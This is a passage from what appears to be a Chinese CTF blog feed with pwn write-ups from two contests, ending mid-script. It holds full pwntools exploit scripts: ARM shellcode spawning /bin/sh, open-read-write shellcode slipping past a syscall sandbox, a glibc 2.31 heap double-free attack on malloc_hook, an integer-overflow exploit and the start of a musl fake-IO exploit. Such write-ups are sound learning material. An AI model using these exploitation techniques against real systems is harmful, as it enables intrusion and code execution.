class="hljs-string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>buf=<span class="hljs-number">0x99D44</span><br>sea(<span class="hljs-string">&quot;&gt; Try typing something first :\n&quot;</span>,shellcode)<br>sla(<span class="hljs-string">&quot;&gt; Get the FLAG by typing a little :\n&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x38</span>+p32(buf))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandbox">sandbox</h2><blockquote><p>代码有些许复杂，但也不用细究，google一下某些特征语句，和libcapstone.so.5这些库可以大致确定方向，稍微看一下伪代码,结合程序运行可以发现：</p></blockquote><p>它实现了一个反汇编器，会把我们的代码翻译成汇编语言展示出来，并执行</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/1.png" alt="1"></p><p>syscall 59也就是系统调用system的话会被检测</p><p>这里a2[20]对应的应该是rax</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/2.png" alt="2"></p><p>那我们就用orw读flag</p><p>题目白给了函数实际地址，相当于bss也知道了，但不用也行</p><p><a href="https://tttang.com/archive/1447/#toc_shellcode_3">这么去orw</a></p><blockquote><p>sc = shellcraft.amd64.open(“./flag”)<br>sc += shellcraft.amd64.read(“rax”, “rsp”, 0x100)<br>sc += shellcraft.amd64.write(1, “rsp”, 0x100)</p></blockquote><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/3.png" alt="3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./sandbox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>ru(<span class="hljs-string">&quot;A gift for you : 0x&quot;</span>)<br>bss=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x1572</span>+<span class="hljs-number">0x6000</span><br>info(<span class="hljs-string">&quot;bss&quot;</span>,bss)<br>sla(<span class="hljs-string">&quot;How long do you need to enter ?\n&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>sc =asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x101010101010101</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x101010101010101 ^ 0x67616c662f2e</span><br><span class="hljs-string">    xor [rsp], rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call open() */</span><br><span class="hljs-string">    push SYS_open /* 2 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor eax, eax /* SYS_read */</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    /* call write() */</span><br><span class="hljs-string">    push SYS_write /* 1 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment">#sc = shellcraft.amd64.open(&quot;./flag&quot;)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.read(&quot;rax&quot;, &quot;rsp&quot;, 0x100)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.write(1, &quot;rsp&quot;, 0x100)</span><br><br>info(<span class="hljs-string">&quot;lenth&quot;</span>,<span class="hljs-built_in">len</span>(sc))<br><span class="hljs-built_in">print</span>(sc)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;Your input : &quot;</span>,sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="no-output-不会">no_output(不会)</h2><p>libc2.31保护全开,用的是calloc分配,size限制[0,0x180]，没有show，存在uaf</p><p>我的想法就是用fastbin doublefree，构造堆重叠，伪造个unsortbin，切割unsortbin使main_arena+96地址到和这个unsortbin重叠的fastbin的fd上，然后Partial overwrite改为malloc_hook的地址，分配fastbin到malloc_hook，改为one_gadget，有几个位要爆破一下</p><p>我已经走到最后一步了,也成功改写为og了，就最后触发报错了</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/4.png" alt="4"></p><p>本题libc是2.31,查阅资料和对比源码后发现，早在2.29就已经对unsortbin进行了双向链表的细致检查</p><p>而我前面的操作已经破坏了它的链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>             || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>也就是说这种方法已经走不通了,要么打IO，用什么方法捏</p><p><strong>失败exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;10.10.30.13&#x27;</span>,<span class="hljs-number">30006</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>ru(<span class="hljs-string">&quot;gift :\n&quot;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x2a0</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#-----fill tcache--------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#-----overlap-------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x350</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x21</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<span class="hljs-comment">#now 5&amp;4 overlap</span><br><span class="hljs-comment">#-----unsortbin----</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">6</span>)<br>    edit(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">5</span>)<br><span class="hljs-comment">#--------------------</span><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">2</span>,p8(<span class="hljs-number">0x3d</span>))<span class="hljs-comment">#0x7fc218ed9be0-96-0x10-0x33</span><br><span class="hljs-comment">#edit(5,p64(0x20)+p64(0)*2+p64(0x51))</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">b&quot;\x2e\x0b\xe8&quot;</span>)<br>og=[<span class="hljs-number">0xe3b2e</span>,<span class="hljs-number">0xe3b31</span>,<span class="hljs-number">0xe3b34</span>]<br>info(<span class="hljs-string">&quot;__malloc_hook&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x70</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>arm</tag>
      
      <tag>数组越界</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022pwnhub冬季赛pwn</title>
    <link href="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <url>/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><h2 id="justJS">justJS</h2><p>v8 pwn，用别人非预期的方法</p><p>俺啥也不会啥也不懂</p><p>输eval(read(‘flag’))换行再换行能读出flag</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/2.png" alt="2"></p><h2 id="探险者">探险者</h2><p>整数溢出，购买防御，打999级怪,抗20轮获得shell</p><p>150*28633116=0x100000068溢出变为0x68</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/1.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>,<span class="hljs-number">27768</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br><span class="hljs-comment">#---------------------------3</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;HP: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;15 &quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        ru(<span class="hljs-string">&quot;GOLD:  &quot;</span>)<br>        num=rc(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;28633116&#x27;</span>)<br><span class="hljs-comment">#---------------------------999</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;LV: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;999&quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.interactive()<br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p>233我纯打游戏写了个脚本，本地行，远端有时间限制，打最后999级的怪最多到round6就给我断了</p><h2 id="heap">heap</h2><p>musl pwn 没接触过，这题就当入门，我分析的很烂，看着乐呵一下就行</p><h3 id="漏洞">漏洞</h3><p>这题全是破绽，可以数组越界，可以堆溢出，free后指针悬挂(不过我还是不太了解在musl中怎么利用)</p><h3 id="利用">利用</h3><p>参考的是<a href="https://wx.zsxq.com/dweb2/index/group/824215518412">nu1l战队在知识星球分享的wp</a>，大致是数组越界达成任意地址读写，用IO打puts来getshell</p><h4 id="1-leak-heap-addr">1.leak heap_addr</h4><p>数组越界show(16)泄露堆地址</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/5.png" alt="5"></p><h4 id="2-leak-pie">2.leak pie</h4><p>填充字符串‘a’，继续配合show(16)泄露pie的偏移</p><p>然后复原一下‘a’覆盖的地址</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/6.png" alt="6"></p><h4 id="3-任意地址读写">3.任意地址读写</h4><p>下标0x390处有个指针指向ptr自己，这样我们就控制了ptr，可以任意地址读写</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/7.png" alt="7"></p><h4 id="4-泄漏libc">4.泄漏libc</h4><p>改ptr指针指向puts的got表，泄漏libc，得到stdout地址</p><h4 id="5-打IO">5.打IO</h4><p>因为musl编译的好像没有malloc_hook,free_hook之类的，就要打IO来getshell</p><p>改ptr指针指向stdout，伪造fakeIO，遇到puts触发getshell</p><p>可以看到最后执行到如图所示</p><p>要执行到这个分支还是要满足一些条件，具体fake_IO要满足哪些条件还是得看源码</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/8.png" alt="8"></p><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span 